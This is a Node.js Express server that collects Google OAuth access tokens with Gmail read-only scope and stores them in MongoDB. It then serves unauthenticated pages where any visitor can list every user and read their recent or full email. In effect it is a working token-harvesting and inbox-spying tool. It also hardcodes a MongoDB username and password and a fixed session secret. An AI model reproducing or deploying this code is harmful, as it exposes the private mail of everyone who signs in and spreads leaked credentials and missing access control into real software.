const express = require('express');
const session = require('express-session');
const passport = require('passport');
const mongoose = require('mongoose');
const { google } = require('googleapis');
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const path = require('path');
require('dotenv').config();

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  secret: 'secret-key',
  resave: false,
  saveUninitialized: true,
}));

app.use(passport.initialize());
app.use(passport.session());

mongoose.connect('mongodb+srv://MyDatabase:Cp8rNCfi15IUC6uc@cluster0.kjbloky.mongodb.net/g', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const User = mongoose.model('User', new mongoose.Schema({
  googleId: String,
  email: String,
  access_token: String,
}));

passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: 'http://localhost:3000/auth/google/callback',
}, async (accessToken, refreshToken, profile, done) => {
  const email = profile.emails[0].value;
  let user = await User.findOne({ googleId: profile.id });
  if (!user) {
    user = await User.create({ googleId: profile.id, email, access_token: accessToken });
  } else {
    user.access_token = accessToken;
    await user.save();
  }
  done(null, user);
}));

passport.serializeUser((user, done) => done(null, user.id));
passport.deserializeUser(async (id, done) => {
  const user = await User.findById(id);
  done(null, user);
});

app.get('/', (req, res) => res.redirect('/view'));

app.get('/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email', 'https://www.googleapis.com/auth/gmail.readonly']
  })
);

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/' }),
  (req, res) => res.redirect('/view')
);

app.get('/view', async (req, res) => {
  const users = await User.find();
  res.render('userList', { users });
});

app.get('/view/:email', async (req, res) => {
  const { email } = req.params;
  const user = await User.findOne({ email });
  if (!user || !user.access_token) return res.send('Token not found');

  const oauth2Client = new google.auth.OAuth2();
  oauth2Client.setCredentials({ access_token: user.access_token });

  const gmail = google.gmail({ version: 'v1', auth: oauth2Client });
  const mails = [];

  const list = await gmail.users.messages.list({ userId: 'me', maxResults: 20 });

  for (const item of list.data.messages || []) {
    const msg = await gmail.users.messages.get({ userId: 'me', id: item.id });
    const headers = msg.data.payload.headers;
    const from = headers.find(h => h.name === 'From')?.value;
    const subject = headers.find(h => h.name === 'Subject')?.value;
    const snippet = msg.data.snippet;
    mails.push({ id: item.id, from, subject, snippet });
  }

  res.render('userMails', { email, mails });
});

app.get('/mail/:email/:id', async (req, res) => {
  const { email, id } = req.params;
  const user = await User.findOne({ email });
  if (!user || !user.access_token) return res.send('Token not found');

  const oauth2Client = new google.auth.OAuth2();
  oauth2Client.setCredentials({ access_token: user.access_token });

  const gmail = google.gmail({ version: 'v1', auth: oauth2Client });
  const msg = await gmail.users.messages.get({ userId: 'me', id, format: 'full' });

  const headers = msg.data.payload.headers;
  const from = headers.find(h => h.name === 'From')?.value;
  const subject = headers.find(h => h.name === 'Subject')?.value;

  let bodyData = msg.data.payload.body?.data;
  if (!bodyData && msg.data.payload.parts) {
    const part = msg.data.payload.parts.find(p => p.mimeType === 'text/html' || p.mimeType === 'text/plain');
    bodyData = part?.body?.data;
  }

  const body = Buffer.from(bodyData || '', 'base64').toString();
  res.render('mail', { email, from, subject, body });
});

app.listen(3000, () => console.log('✅ Server running at http://localhost:3000'));